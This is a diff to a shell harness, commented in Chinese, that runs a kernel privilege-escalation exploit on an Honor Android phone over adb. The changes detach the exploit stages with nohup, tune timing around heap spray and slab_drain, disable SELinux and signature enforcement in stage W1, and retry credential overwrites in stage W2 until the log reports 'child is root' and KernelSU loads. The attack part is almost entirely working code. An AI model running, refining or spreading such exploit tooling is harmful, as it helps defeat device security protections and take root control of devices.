@@ -92,14 +92,62 @@ run_to() { # $1=secs $2=logfile $3...=command
   return $rc
 }
 
+# ---- detached runner (FNE-AN00 8.0.0.202, 2026-11-10) --------------------
+# 这台机器上 exploit 的 P3 waiter 设计上要「parking forever」（w1 日志原文：
+# "post-walk exit would walk the ghost on a torn-down stack and panic"）。
+# 前台 `adb shell "env ... --write1"` 会在 W1 收尾时把该进程连同 adb 会话
+# 一起回收 -> 内核走穿被 free 的栈 -> 保护性重启（真机复现两次，w1 rc=255）。
+# 因此 W1/W2 一律 nohup 脱离会话后台起、设备端落日志，主机侧增量回显：
+#   - 进程留着不杀（它必须活着把 ghost 顶住）；
+#   - 等日志安静下来再起 W2，避开「W1b fork 风暴还没跑完就叠 W2」的竞争。
+detach_start() { # $1=设备端日志 $2...=设备端命令
+  local rlog=$1; shift
+  $T30 adb shell "rm -f $rlog" >/dev/null 2>&1
+  $T30 adb shell "nohup $* > $rlog 2>&1 < /dev/null &" >/dev/null 2>&1
+}
+
+detach_wait() { # $1=秒 $2=设备端日志 $3=本地日志 $4=安静多久算完成 $5=硬结束标志 ; $6..=成功标志
+  local secs=$1 rlog=$2 lf=$3 quiet_need=$4 hard=$5; shift 5
+  local shown=0 total quiet=0 hit=0 end=$((SECONDS + secs))
+  : > "$lf"
+  while [ "$SECONDS" -lt "$end" ]; do
+    $T30 adb shell "cat $rlog 2>/dev/null" > "$lf.tmp" 2>/dev/null
+    total=$(wc -l < "$lf.tmp" 2>/dev/null | tr -d ' ')
+    case "$total" in ''|*[!0-9]*) total=$shown ;; esac
+    if [ "$total" -gt "$shown" ]; then
+      sed -n "$((shown + 1)),${total}p" "$lf.tmp"
+      shown=$total
+      quiet=0
+    else
+      quiet=$((quiet + 1))
+    fi
+    cp -f "$lf.tmp" "$lf" 2>/dev/null
+    hit=0
+    if [ -n "$hard" ] && grep -q -- "$hard" "$lf" 2>/dev/null; then
+      hit=2
+    else
+      for pat in "$@"; do
+        if grep -q -- "$pat" "$lf" 2>/dev/null; then hit=1; break; fi
+      done
+    fi
+    [ "$hit" = "2" ] && [ "$quiet" -ge 2 ] && break
+    [ "$hit" = "1" ] && [ "$quiet" -ge "$quiet_need" ] && break
+    sleep 1
+  done
+  rm -f "$lf.tmp"
+  return 0
+}
+
 ADJ=0
 # Background app storms (photos indexing, searchservice) break W1 timing.
 settle() {
   $T30 adb shell "am force-stop com.hihonor.photos" 2>/dev/null
   $T30 adb shell "am force-stop com.hihonor.searchservice" 2>/dev/null
-  $T30 adb shell "am kill-all" 2>/dev/null
-  $T30 adb shell "pm trim-caches 999999999999" 2>/dev/null
-  sleep 60 # minimum post-boot quiesce
+  # 2026-11-10：删掉 `am kill-all` 与 `pm trim-caches`。harness（3/5 成功）只做
+  # force-stop + 短等待；这两个动作会在 W1 窗口里制造后台服务重启和页缓存回收，
+  # 正好撞上 exploit 的 heap spray / slab_drain —— 实测 run_w2.sh 两次 W1 失败，
+  # 其中一次 dm gate 连跑 192 轮找不到合格页。最小静默也从 60s 降到 20s。
+  sleep 20 # minimum post-boot quiesce
   # Gate on REAL CPU idle (loadavg is faked by D-state ufs kworkers):
   # sample /proc/stat, require idle delta >= 85% over a 5s window.
   local i=0 a b id
@@ -137,9 +185,14 @@ for try in 1 2 3 4 5 6 7 8; do
   en=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r')
   echo "=== TRY $try ADJ=$ADJ $(date +%T) getenforce=$en ==="
   if [ "$en" != "Permissive" ]; then
-    echo "--- [W1] 关闭 SELinux (--write1), 最长 420s, TRY $try ---"
-    run_to 420 "w1_try$try.log" adb shell "env $SYNC $E --write1"
-    echo "w1 rc=$? : $(grep -E 'SELinux DISABLED|Write 1 failed' w1_try$try.log | tail -1)"
+    echo "--- [W1] 关闭 SELinux (--write1, detached), 最长 420s, TRY $try ---"
+    detach_start /data/local/tmp/gl_w1.log env $SYNC $E --write1
+    # 与 harness 对齐：一看到 SELinux DISABLED 就往下走，不等 W1b（sig_enforce）
+    # 收尾 —— harness 3/5 成功用的就是这条时序；这里若等「安静 20s」会把 W2
+    # 推到 W1b 之后，实测两次都在 W1b 的第二次 slab_drain 上 panic。
+    detach_wait 420 /data/local/tmp/gl_w1.log "w1_try$try.log" 0 "Write 1 failed" \
+      "SELinux DISABLED" "SIG_ENFORCE DISABLED"
+    echo "w1 markers: $(grep -E 'SELinux DISABLED|SIG_ENFORCE DISABLED|Write 1 failed' w1_try$try.log | tail -1)"
     # W1 打出 DISABLED 后 adbd/USB 常瞬断, 单次 getenforce 空响应会把
     # 成功误判为失败白白重启(grind_reboot3 实测 10+ try 多次踩中);
     # 改为最多 6 次重试, 仅确认非 Permissive 才判失败。
@@ -178,14 +231,19 @@ for try in 1 2 3 4 5 6 7 8; do
   # Up to 3 W2 invocations on this permissive boot: a clean miss leaves the
   # device permissive (free retry — the 02:48 miss -> 02:52 success path);
   # only a crash (device lost) or success ends the boot early.
+  # harness 时序：Permissive 出现后约 15s 再起 W2（那时 W1b 的 sig_enforce 已写完，
+  # 又不至于等到下次 slab_drain 与 W2 重叠）。
+  sleep 15
   w2n=0
   w2done=0
   while [ $w2n -lt 3 ]; do
     w2n=$((w2n+1))
     echo "--- [W2] cred 写入 (rounds=2 ADJ=$ADJ), 第 ${w2n}/3 次, 最长 900s ---"
-    run_to 900 "w2_try${try}_${w2n}.log" adb shell "env $SYNC GL_W2_ROUNDS=2 GL_W2_CRED_ADJ=$ADJ $E"
-    rc=$?
-    echo "w2 rc=$rc (w2 attempt $w2n) last: $(tail -2 w2_try${try}_${w2n}.log | tr '\n' ' ')"
+    detach_start /data/local/tmp/gl_w2.log env $SYNC GL_W2_ROUNDS=2 GL_W2_CRED_ADJ=$ADJ $E
+    # W2 命中 "child is root"/KSU 后日志还会再跑 ~25s 的 KSU 链，等它安静 10s 再收。
+    detach_wait 900 /data/local/tmp/gl_w2.log "w2_try${try}_${w2n}.log" 10 "" \
+      "child is root" "KSU LOADED" "KernelSU helper reports ready" "child uid = 2000" "erase_ran=1"
+    echo "w2 attempt $w2n last: $(tail -2 w2_try${try}_${w2n}.log | tr '\n' ' ')"
     if grep -q "child is root" "w2_try${try}_${w2n}.log"; then
       echo "=== W2 ROOT ACHIEVED TRY $try ==="
       w2done=1
